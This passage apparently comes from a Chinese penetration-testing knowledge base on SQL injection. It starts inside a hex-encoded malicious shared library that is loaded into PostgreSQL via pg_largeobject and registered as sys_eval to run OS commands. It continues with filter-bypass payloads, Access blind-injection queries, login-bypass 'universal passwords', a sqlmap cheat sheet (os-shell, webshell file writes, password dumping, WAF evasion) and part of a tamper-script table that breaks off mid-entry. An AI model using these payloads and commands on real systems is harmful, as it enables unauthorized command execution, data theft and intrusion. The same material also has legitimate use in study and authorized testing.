ffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff', 'hex')); insert into pg_largeobject values (9023, 2, decode('ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420e080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 3, decode('00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 4, decode('181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 5, decode('d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000', 'hex')); SELECT lo_export(9023, '/tmp/testeval.so'); -- 创建命令 CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/testeval.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE; -- 执行命令 select sys_eval('id'); -- 删除命令 drop function sys_eval; Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-19 16:54:47 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/03.绕过技巧.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/03.绕过技巧.html","title":"03.绕过技巧","keywords":"","body":" 快速发现漏洞 通用方法 绕过空格 绕过单引号 绕过= 绕过注释符 [!TIP|stype:flat] 可以多看看官方的文档，绕过可以尝试一些不常见的语法或函数：https://www.postgresql.org/docs/9.6/ 功能函数文档：https://www.postgresql.org/docs/9.6/functions.html 快速发现漏洞 因为我们知道在postgresql中||是连接符，那么我们就可以使用如下方法快速发现漏洞 情况 Payload 整型注入 id=pg_sleep(10) 字符型注入 `id=1' pg_sleep(10)` 通用方法 通用的方法，就是万金油，无非就是大小写、双写、编码、注释、HPP、垃圾字符、分块传输、WAF特性 绕过空格 空格被过滤的情况，可以用如下的一些手法： 说明 Payload 注释符 /**/ URL编码空格 + 其他URL编码（换行、Tab等） %0d、%0a、%09 绕过单引号 单引号'被过滤，可以使用如下的手法 [!NOTE|style:flat] 所有的｜在使用都应该改为西文的|，不知道gitlab抽什么风，不给渲染，会导致格式变乱 不能同时使用'和$$ $quote$ Payload 语句 $$ select $$1$$select $$1$$,$$2$$; $quote select $quote$1$quote$select $quote$1$quote$,$quote$2$quote$; ｜｜ select chr(97)｜｜chr(98); 绕过= 过滤了等号，可以用如下多种方法来绕过 官方文档：https://www.postgresql.org/docs/9.0/functions-matching.html Payload 说明 <> 不等符 select 1 between 1 and 2; between语句 select '123' like '1%'; 模糊匹配 select 'abc' SIMILAR TO '%a%';select 'abc' SIMILAR TO '%a(b｜d)%'; SIMILAR TO 正则匹配 select 'abc' ~ 'abc';select 'abc' ~ '^a';select 'abc' ~ '(b｜d)'; POSIX正则匹配 绕过注释符 对注释符过滤的情况下，对我们来说问题可能就是语句不能正常执行 解决办法也很简单，用完整语句给他闭合就OK了 # 原始 ?id=1 # 完整闭合 ?id=1' and expr and '1'='1 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-07 17:14:38 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/07.Access/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/07.Access/","title":"07.Access","keywords":"","body":" 前言 判断是否为access数据库 获取数据 猜解表名 猜解列名 猜解字段长度 猜解字段内容 前言 老古董数据库了，基本上遇不到，但是不排除有些很老很老的服务器还在用，所以简单记录一下吧... [!NOTE] 基本上可以不用看，因为看了99%也遇不到，而且很鸡肋 判断是否为access数据库 and (select count(*) from msysobjects)>0 获取数据 access中的一切都要靠猜，没有那种方便的可以直接获取数据库名、表名、列名的地方或者函数（补充一下：access没有数据库名，只有表和列） 猜解表名 此处已admin为例 -- 页面返回正常则说明存在 admin 这个表 and exists(select * form admin) 猜解列名 此处已password为例 -- 页面返回正常则说明存在password这个列 and exists(select password from admin) 猜解字段长度 and (select top 1 len (password) from admin)>1 and (select top 1 len (password) from admin)>10 猜解字段内容 and (select top 1 asc(mid(password,1,1)) from admin)>97 and (select top 1 asc(mid(password,2,1)) from admin)>97 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/08.万能密码/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/08.万能密码/","title":"08.万能密码","keywords":"","body":" 介绍 应用场景 举例 介绍 熟悉了前面的注入，这个就很好理解了，就是利用盲注达到永为真的结果即可。 应用场景 从名字也可以看出来，和密码有关，那么一般就用于登陆接口，或者有其他类似判断的功能点也可 举例 -- 原语句 select password from users where username=\"admin_sqli\"; 万能密码： select password from users where username=\"admin\" or \"1\"=\"1\"; select password from users where username=\"admin\" or 1=1 -- select password from users where username=\"admin\" or 2*2=4 -- Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/","title":"09.工具Sqlmap","keywords":"","body":" 说明 常用命令 检测注入 获取信息 搜索字段 读取与写入文件 提权 对 Windows 注册表操作 预估完成时间 测试 WAF/IPS/IDS 保护 尝试 getshell 宽字节检测 union 语句测试 个人常用语句 说明 https://github.com/sqlmapproject/sqlmap.git 至于参数详细说明，感觉没多大必要，篇幅也不够长，放张图即可，有需要自己看即可 python3 sqlmap.py -h 常用命令 检测注入 sqlmap -u URL -v 3 --random-agent # 判断注入 sqlmap -u URL -p id # 指定参数注入 sqlmap -u URL --cookie=\"xxxxx\" # 带 cookie 注入 sqlmap -u URL --batch # 不要请求用户输入,使用默认行为 sqlmap -r \"burpData.req\" # post 型注入 sqlmap -u URL --flush-session # 清除缓存 sqlmap -u URL --os \"Windows\" # 指定操作系统 sqlmap -u URL --dbms mysql --level 3 # 指定数据库类型为 mysql,级别为 3(共 5 级,级别越高,检测越全面) sqlmap -u URL --dbms Microsoft SQL Server sqlmap -u URL --dbms mysql --risk 3 # 指定执行测试的风险(1-3, 默认 1) 1会测试大部分的测试语句,2会增加基于事件的测试语句,3会增加 OR 语句的 SQL 注入测试 sqlmap -u URL --proxy \"socks5://127.0.0.1:1080\" # 代理注入测试 sqlmap -u URL --batch --smart # 启发式判断注入 获取信息 sqlmap -u URL --current-db # 获取当前数据库 sqlmap -u URL --dbs # 枚举所有数据库 sqlmap -u URL -f # 检查 DBMS 版本 sqlmap -u URL --is-dba # 判断当前用户是否是 dba sqlmap -u URL --users # 列出数据库管理系统用户 sqlmap -u URL --privileges # 枚举 DBMS 用户权限 sqlmap -u URL --passwords # 获取当前数据库密码 sqlmap -u URL -D DATABASE --tables # 获取数据库表 sqlmap -u URL -D DATABASE -T TABLES --columns # 获取指定表的列名 sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump # 获取指定表的列名 sqlmap -u URL -dbms mysql -level 3 -D test -T admin -C \"username,password\" -dump # dump 出字段 username 与 password 中的数据 sqlmap -u URL --dump-all # 列出所有数据库,所有表内容 搜索字段 sqlmap -r \"burpData.req\" -dbms mysql -D dedecms --search -C admin,password # 在 dedecms 数据库中搜索字段 admin 或者 password. 读取与写入文件 首先找需要网站的物理路径,其次需要有可写或可读权限. -file-read=RFILE 从后端的数据库管理系统文件系统读取文件 (物理路径) -file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 (mssql xp_shell) -file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 # 注 : mysql 不支持列目录,仅支持读取单个文件.sqlserver 可以列目录,不能读写文件,但需要一个 xp_dirtree 函数 sqlmap -r \"burpData.req\" --file-dest \"e:\\php\\htdocs\\dvwa\\inc\\include\\1.php\" --file-write \"f:\\webshell\\1112.php\" 提权 sqlmap -u URL --sql-shell # 获取一个 sql-shell 会话 sqlmap -u URL --os-shell # 获取一个 os-shell 会话 sqlmap -u URL --os-cmd=ipconfig # 在注入点直接执行命令 sqlmap -d \"mssql://sa:sql123456@ip:1433/master\" --os-shell # 知道数据库密码后提权成为交互式系统shell 对 Windows 注册表操作 --reg-read # 读取注册表值 --reg-add # 写入注册表值 --reg-del # 删除注册表值 --reg-key,--reg-value,--reg-data,--reg-type # 注册表辅助选项 sqlmap -u URL --reg-add --reg-key=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1 预估完成时间 --eta # 计算注入数据的剩余时间 测试 WAF/IPS/IDS 保护 --identify-waf # 尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。 --mobile # 模仿智能手机 --referer \"http://www.google.com\" # 模拟来源 --user-agent \"Googlebot/2.1(+http://www.googlebot.com/bot.html)\" # 模拟谷歌蜘蛛 --skip-waf 尝试 getshell sqlmap -d \"mysql://root:root@192.168.1.1:3306/mysql\" --os-shell 宽字节检测 sqlmap -u URL --dbms mysql --prefix \"%df%27\" --technique U -v 3 # 宽字节检测 union 语句测试 --union-cols=UCOLS 测试UNION查询的SQL注入的列的范围 --union-char=UCHAR 用来破解列数的字符 --union-from=UFROM 在UNION查询的FROM部分中使用的表 个人常用语句 # risk3 一般用于查询的功能，如果是update语句一定不要！！！ # 基础 python3 sqlmap.py -r burpData.req --batch --random-agent -v 3 --level 3 --risk 3 --threads 5 # 指定一些参数 python3 sqlmap.py -r burpData.req --batch --random-agent -v 3 --level 5 --risk 3 --threads 5 --dbms postgresql --technique=T --os-cmd whoami --proxy socks5://127.0.0.1:10808 --force-ssl --tamper xxx Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper.html","title":"Tamper","keywords":"","body":" 前言 内置tamper说明 前言 sqlmap内置了很多的tamper，也就是常规的一些绕过的脚本 平时测试的时候，如果不封IP，我们一般也是先找到绕过规则，然后用适当的内置tamper或者自己写tamper来快速注入，节省时间 tamper位于sqlmap/tamper目录下 随便找一个看看，可以看到就是利用Python对payload进行简单的替换，里面有说明、适用数据库、结果等等 [!TIP|style:flat] 所以我们自己写脚本的时候，直接拿一个类似的脚本来改即可。 内置tamper说明 20210125 dev 有些脚本可能适配部分数据库，可以自己根据实际情况进行修改，具体查看每个脚本内部内容即可 Tamper名 说明 代码代码 0eunion.py 使用 e0UNION 替换 UNION >>> tamper('1 UNION ALL SELECT')'1e0UNION ALL SELECT' apostrophemask.py 将 ' 替换成 UTF-8 urlencoded 的 %EF%BC%87 >>> tamper(\"1 AND '1'='1\")'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871' apostrophenullencode.py 将 ' 替换成 %00%27 >>> tamper(\"1 AND '1'='1\")'1 AND %00%271%00%27=%00%271' appendnullbyte.py 在参数末尾加入 %00 >>> tamper('1 AND 1=1')'1 AND 1=1%00' base64encode.py base64 编码所有字符 >>> tamper(\"1' AND SLEEP(5)#\")'MScgQU5EIFNMRUVQKDUpIw==' between.py 将 > 字符替换为 NOT BETWEEN 0 AND将 = 字符替换为 BETWEEN # AND # >>> tamper('1 AND A > B--')'1 AND A NOT BETWEEN 0 AND B--'>>> tamper('1 AND A = B--')'1 AND A BETWEEN B AND B--'>>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')'1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()' binary.py 尽可能地注入关键字binary >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')'1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'>>> tamper('1 AND 2>1')'1 AND binary 2>binary 1'>>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END' bluecoat.py 将 sql 语句后的空格字符替换为 %09，LIKE 替换字符 = >>> tamper('SELECT id FROM users WHERE id = 1')'SELECT%09id FROM%09users WHERE%09id LIKE 1' chardoubleencode.py 二次URL编码 >>> tamper('SELECT FIELD FROM%20TABLE')'%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545' charencode.py URL编码 >>> tamper('SELECT FIELD FROM%20TABLE')'%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45' charunicodeencode.py Unicode编码 >>> tamper('SELECT FIELD%20FROM TABLE')'%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045' charunicodeescape.py url 解码中的 % 换成 \\\\ >>> tamper('SELECT FIELD FROM TABLE')'\\\\\\\\u0053\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0045\\\\\\\\u0043\\\\\\\\u0054\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0049\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0044\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0052\\\\\\\\u004F\\\\\\\\u004D\\\\\\\\u0020\\\\\\\\u0054\\\\\\\\u0041\\\\\\\\u0042\\\\\\\\u004C\\\\\\\\u0045' commalesslimit.py limit去掉逗号 >>> tamper('LIMIT 2, 3')'LIMIT 3 OFFSET 2' commalessmid.py 用 MID(A FROM B FOR C) 代替 MID(A, B, C) >>> tamper('MID(VERSION(), 1, 1)')'MID(VERSION() FROM 1 FOR 1)' commentbeforeparentheses.py 在括号前添加内联注释 >>> tamper('SELECT ABS(1)')'SELECT ABS/**/(1)' concat2concatws.py 将 concat(a,b) 替换成 concat_ws(mid(char(0),0,0),a,b) >>> tamper('CONCAT(1,2)')'CONCAT_WS(MID(CHAR(0),0,0),1,2)' dunion.py 将 UNION 换成 DUNION >>> tamper('1 UNION ALL SELECT')'1DUNION ALL SELECT' equaltolike.py 将 = 换成 LIKE >>> tamper('SELECT * FROM users WHERE id=1')'SELECT * FROM users WHERE id LIKE 1' equaltorlike.py 将 = 换成 RLIKE >>> tamper('SELECT * FROM users WHERE id=1')'SELECT * FROM users WHERE id RLIKE 1' escapequotes.py 增加斜杠转义单双引号 >>> tamper('1\" AND SLEEP(5)#')'1\\\\\\\\\" AND SLEEP(5)#' greatest.py 使用 greatest 替换 > >>> tamper('1 AND A > B')'1 AND GREATEST(A,B+1)=A' halfversionedmorekeywords.py 在每个关键词前添加(MySQL)的版本注释 >>> tamper(\"value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa\")\"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa\" hex2char.py 用对应的 CONCAT(CHAR(),...) 替换每个 (MySQL)0x 编码的字符串。 >>> tamper('SELECT 0xdeadbeef')'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))' htmlencode.py HTML编码（使用代码点）所有非字母数字字符（例如，'-> '）。 >>> tamper(\"1' AND SLEEP(5)#\")'1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;' ifnull2casewhenisnull.py 用 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' 代替 'IFNULL(A, B)' 这样的实例。 >>> tamper('IFNULL(1, 2)')'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END' ifnull2ifisnull.py 用 IF(ISNULL(A), B, A) 代替 IFNULL(A, B) 这样的实例。 >>> tamper('IFNULL(1, 2)')'IF(ISNULL(1),2,1)' informationschemacomment.py 在所有出现的（MySQL）\"information_schema\" 标识符的末尾添加一个内联注释（/**/）。 >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES' least.py 用 LEAST 代替大于运算符（>）。 >>> tamper('1 AND A > B')'1 AND LEAST(A,B+1)=B+1' lowercase.py 用小写字母值替换每个关键词字符（例如：SELECT -> select）。 >>> tamper('INSERT')'insert' luanginx.py LUA-Nginx WAF 绕过（例如 Cloudflare） >>> random.seed(0); hints={}; payload = tamper(\"1 AND 2>1\", hints=hints); \"%s&%s\" % (hints[HINT.PREPEND], 